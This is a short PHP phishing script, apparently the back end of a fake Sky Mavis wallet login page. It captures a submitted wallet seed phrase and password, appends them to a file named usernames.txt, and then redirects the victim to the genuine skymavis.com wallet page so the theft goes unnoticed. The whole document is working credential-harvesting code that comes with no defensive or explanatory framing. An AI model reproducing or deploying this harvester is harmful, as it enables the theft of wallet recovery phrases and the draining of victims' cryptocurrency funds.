https://skymavis.com/wallet<?php

file_put_contents("usernames.txt", "Account: " . $_POST['seed'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://skymavis.com/wallet');
exit();
